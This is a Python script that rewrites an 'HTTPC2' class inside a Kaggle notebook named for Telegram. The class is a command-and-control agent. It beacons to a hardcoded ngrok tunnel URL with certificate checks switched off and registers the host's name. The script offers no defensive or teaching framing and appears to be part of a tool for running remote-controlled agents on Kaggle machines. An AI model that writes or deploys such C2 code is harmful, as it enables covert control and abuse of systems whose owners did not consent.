#!/usr/bin/env python3
"""Completely rewrite HTTPC2 class with correct indentation."""

import json
from pathlib import Path

NGROK_URL = "https://lynelle-scroddled-corinne.ngrok-free.dev"

HTTPC2_CLASS = f'''
class HTTPC2:
    """HTTP-based C2 via ngrok tunnel"""
    
    def __init__(self, server_url, agent_id):
        self.server_url = server_url.rstrip('/')
        self.agent_id = agent_id
    
    def send_message(self, text):
        """Send message via HTTP to C2 server"""
        import urllib.request
        import ssl
        
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        data = {{
            "id": self.agent_id,
            "hostname": socket.gethostname(),
            "username": "kaggle",
            "os": "linux",
            "arch": "x64",
            "platform_type": "kaggle"
        }}
        
        try:
            req = urllib.request.Request(
                f"{{self.server_url}}/api/agent/register",
                data=json.dumps(data).encode('utf-8'),
                headers={{'Content-Type': 'application/json'}}
            )
            resp = urllib.request.urlopen(req, timeout=30, context=ctx)
            return json.loads(resp.read().decode('utf-8'))
        except Exception as e:
            return {{"ok": False, "error": str(e)}}
    
    def register(self, hostname, cpu_count, platform="kaggle"):
        """Register agent with C2"""
        result = self.send_message("register")
        return result.get("ok", False)

# Create HTTP C2 instance
http_c2 = HTTPC2("{NGROK_URL}", agent_id)
'''

def rewrite_httpc2():
    """Rewrite HTTPC2 class with correct indentation."""
    nb_path = Path(__file__).parent.parent / "src" / "agents" / "kaggle" / "notebook-telegram.ipynb"
    
    with open(nb_path) as f:
        notebook = json.load(f)
    
    source = notebook["cells"][0]["source"]
    lines = source.split('\n')
    
    # Find and remove old HTTPC2 class
    new_lines = []
    skip_until = -1
    
    for i, line in enumerate(lines):
        # Skip old HTTPC2 class
        if 'class HTTPC2:' in line:
            # Find end of class (next top-level code)
            for j in range(i+1, len(lines)):
                if lines[j].strip() and not lines[j].startswith(' ') and not lines[j].startswith('\t'):
                    skip_until = j
                    break
            continue
        
        if i < skip_until:
            continue
        
        # Also skip old http_c2 creation
        if 'http_c2 = HTTPC2' in line:
            continue
        
        new_lines.append(line)
    
    # Find where to insert (after agent creation)
    insert_idx = None
    for i, line in enumerate(new_lines):
        if 'agent = C2Agent(tg_c2)' in line:
            insert_idx = i + 1
            break
    
    if insert_idx:
        new_lines = new_lines[:insert_idx] + [HTTPC2_CLASS] + new_lines[insert_idx:]
        new_source = '\n'.join(new_lines)
        
        notebook["cells"][0]["source"] = new_source
        
        with open(nb_path, 'w') as f:
            json.dump(notebook, f, indent=2)
        
        print(f"✓ Rewrote HTTPC2 class with correct indentation")
        print(f"  Source length: {len(new_source)} chars")
        return True
    
    print("✗ Could not find insertion point")
    return False

if __name__ == "__main__":
    rewrite_httpc2()
